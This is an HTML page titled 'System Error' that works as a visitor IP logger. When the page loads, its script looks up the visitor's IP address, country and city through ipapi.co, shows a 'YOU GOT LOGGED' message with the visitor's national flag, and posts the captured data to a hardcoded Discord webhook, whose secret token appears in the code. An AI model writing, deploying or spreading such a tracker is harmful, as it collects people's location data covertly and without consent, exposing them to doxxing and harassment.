<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Error</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .status-text {
            font-size: 3.5rem;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 8px;
            color: #fff;
            text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 40px #fff;
            margin-bottom: 10px;
            text-align: center;
        }

        .info-box {
            font-size: 1.1rem;
            color: #888;
            margin-bottom: 50px;
            text-align: center;
        }

        #ip, #country { color: #fff; font-weight: bold; }

        /* Flag & Pole Setup */
        .scene {
            position: relative;
            display: flex;
            align-items: flex-start;
        }

        /* The Pole */
        .pole {
            width: 8px;
            height: 250px;
            background: linear-gradient(90deg, #333, #777, #333);
            border-radius: 4px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
        }

        /* The Real Waving Flag */
        .flag-cloth {
            width: 220px;
            height: 140px;
            background-size: cover;
            background-position: center;
            /* The "Real Wave" Effect using a mesh-like distortion */
            animation: flag-wave 3s i-out infinite;
            transform-origin: left center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
            /* Mask to make it look like cloth */
            mask-image: linear-gradient(to right, rgba(0,0,0,1) 0%, rgba(0,0,0,0.8) 50%, rgba(0,0,0,1) 100%);
        }

        @keyframes flag-wave {
            0% { 
                transform: perspective(1000px) rotateY(0deg) rotateX(0deg); 
            }
            25% { 
                transform: perspective(1000px) rotateY(15deg) rotateX(2deg) skewY(-2deg); 
            }
            50% { 
                transform: perspective(1000px) rotateY(0deg) rotateX(-2deg) skewY(2deg); 
            }
            75% { 
                transform: perspective(1000px) rotateY(-15deg) rotateX(2deg) skewY(-2deg); 
            }
            100% { 
                transform: perspective(1000px) rotateY(0deg) rotateX(0deg); 
            }
        }
    </style>
</head>
<body>

    <div class="status-text">YOU GOT LOGGED</div>
    
    <div class="info-box">
        <p>ADDRESS: <span id="ip">INTERCEPTING...</span></p>
        <p>ORIGIN: <span id="country">LOCATING...</span></p>
    </div>

    <div class="scene">
        <div class="pole"></div>
        <div id="flag" class="flag-cloth"></div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457197434143899753/ELCSRJrIgs0O7LfzURYE7xKGk85ZkU6GXIVf6fOtkTEfMj9haJhOqUL8dFB7KApiKiOf";

        async function initLogger() {
            try {
                // Using ipapi for stable flag codes
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                document.getElementById('ip').innerText = data.ip;
                document.getElementById('country').innerText = data.country_name.toUpperCase();
                
                // Set the background image of the cloth to the user's flag
                const code = data.country_code.toLowerCase();
                const flagUrl = `https://flagcdn.com/w640/${code}.png`;
                document.getElementById('flag').style.backgroundImage = `url('${flagUrl}')`;

                // Discord Webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "ðŸ’€ DATA CAPTURED",
                            color: 0,
                            fields: [
                                { name: "IP Address", value: `\`${data.ip}\``, inline: true },
                                { name: "Location", value: `${data.country_name}`, inline: true },
                                { name: "City", value: `${data.city}`, inline: true }
                            ],
                            footer: { text: "Logger v3.0" },
                            timestamp: new Date()
                        }]
                    })
                });

            } catch (err) {
                console.error("Logger Failed");
            }
        }

        window.onload = initLogger;
    </script>
</body>
</html>
